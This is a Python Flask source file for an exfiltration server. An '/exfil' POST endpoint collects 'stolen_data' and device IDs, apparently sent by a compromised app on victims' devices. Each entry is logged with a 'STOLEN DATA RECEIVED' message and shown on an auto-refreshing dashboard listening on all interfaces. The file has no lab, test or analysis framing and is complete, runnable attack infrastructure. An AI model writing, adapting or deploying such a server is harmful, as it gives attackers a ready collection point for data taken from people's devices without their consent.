from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

stolen_data = []

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Data Dashboard</title>
    <style>
        body { 
            background: #f0f8ff; /* Soft Alice Blue */
            color: #333333; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            padding: 30px; 
            max-width: 900px;
            margin: 0 auto;
        }
        h1 { 
            color: #2c3e50; 
            font-size: 28px; 
            border-bottom: 2px solid #bdc3c7; 
            padding-bottom: 10px; 
            margin-bottom: 10px;
        }
        .status { 
            color: #27ae60; 
            font-size: 16px; 
            font-weight: bold;
            margin-bottom: 30px; 
        }
        .data-block {
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-left: 5px solid #3498db; /* Friendly Blue Accent */
            border-radius: 8px; /* Soft rounded corners */
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05); /* Soft shadow */
        }
        .meta { 
            color: #7f8c8d; 
            font-size: 14px; 
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px dashed #ecf0f1;
            padding-bottom: 10px;
        }
        .codes { 
            color: #2c3e50; 
            font-size: 15px; 
            white-space: pre-wrap; 
            margin: 0; 
            font-family: monospace;
            background: #f8f9fa;
            padding: 10px;
            border-radius: 4px;
        }
        .empty { 
            color: #95a5a6; 
            font-style: italic; 
            padding: 30px 0;
            text-align: center;
            background: #ffffff;
            border-radius: 8px;
            border: 1px dashed #bdc3c7;
        }
    </style>
    <script>
        setInterval(() => window.location.reload(), 3000);
    </script>
</head>
<body>
    <h1>Data Dashboard</h1>
    <div class="status">Server is running and listening for data...</div>

    <div class="feed">
        {% if entries %}
            {% for entry in entries %}
            <div class="data-block">
                <div class="meta">
                    <span><strong>Device ID:</strong> {{ entry.device_id }}</span>
                    <span>{{ entry.timestamp }}</span>
                </div>
                <pre class="codes">{{ entry.data }}</pre>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">Waiting for incoming data from the app...</div>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route("/")
def dashboard():
    return render_template_string(DASHBOARD_HTML, entries=stolen_data)

@app.route("/exfil", methods=["POST"])
def exfil():
    data = request.json
    entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "device_id": data.get("device_id", "unknown"),
        "data": data.get("stolen_data", ""),
    }
    stolen_data.insert(0, entry)
    print(f"\n[!] STOLEN DATA RECEIVED:")
    print(f"    Device: {entry['device_id']}")
    print(f"    Data:\n    {entry['data']}")
    return jsonify({"status": "received"}), 200

if __name__ == "__main__":
    print("Server starting on http://0.0.0.0:5000")
    print("Waiting for exfiltrated data...\n")
    app.run(host="0.0.0.0", port=5000, debug=False)